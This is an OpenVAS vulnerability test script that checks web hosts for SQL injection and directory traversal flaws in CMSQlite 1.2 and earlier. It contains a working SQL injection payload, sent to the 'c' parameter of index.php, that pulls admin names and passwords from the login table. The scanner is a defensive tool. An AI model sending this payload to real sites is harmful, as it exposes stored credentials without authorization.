##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cmsqlite_sql_inj_n_dir_trav_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# CMSQlite 'index.php' SQL Injection and Directory Traversal Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute SQL commands and
  arbitrary local files.
  Impact Level: Application.";
tag_affected = "CMSQlite version 1.2 and prior.";

tag_insight = "The flaws are due to,
   - Improper validation of user supplied input to 'c' parameter in 'index.php',
     allows attackers to execute SQL commands.
   - Improper validation of user supplied input to 'mod' parameter in 'index.php',
     allows attackers to include and execute local files.";
tag_solution = "No solution or patch is available as of 04th June, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.cmsqlite.net/";
tag_summary = "This host is running CMSQlite and is prone to multiple SQL injection
  and directory traversal vulnerabilities.";

if(description)
{
  script_id(800789);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-06-09 08:34:53 +0200 (Wed, 09 Jun 2010)");
  script_cve_id("CVE-2010-2095", "CVE-2010-2096");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("CMSQlite 'index.php' SQL Injection and Directory Traversal Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://php-security.org/2010/05/15/mops-2010-029-cmsqlite-c-parameter-sql-injection-vulnerability/index.html");
  script_xref(name : "URL" , value : "http://php-security.org/2010/05/15/mops-2010-030-cmsqlite-mod-parameter-local-file-inclusion-vulnerability/index.html");

  script_description(desc);
  script_summary("Check the exploit string on CMSQlite");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_require_ports("Services/www", 80);
  script_family("Web application abuses");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

## Get HTTP Port
cmsPort = get_http_port(default:80);
if(!get_port_state(cmsPort)){
  exit(0);
}

foreach path (make_list("/", "/cmsqlite", "/cmsqlite10", cgi_dirs()))
{
  ## Send and receive response
  sndReq = http_get(item:string(path, "/index.php"), port:cmsPort);
  rcvRes = http_send_recv(port:cmsPort, data:sndReq);

  ## Confirm the application
  if(">CMSQlite<" >< rcvRes)
  {
    ## Try an exploit
    sndReq = http_get(item:string(path, "/index.php?c=2-2%20UNION%20ALL%20" +
                          "SELECT%202,name%20||%20password,%203,4,5,6%20FR" +
                          "OM%20login%20limit%201%20--%20x"), port:cmsPort);
    rcvRes = http_send_recv(port:cmsPort, data:sndReq);

    ## Confirm the vulnerability
    if(!isnull(rcvRes) && eregmatch(pattern:">admin.*</",string:rcvRes))
    {
      security_hole(cmsPort);
      exit(0);
    }
  }
}
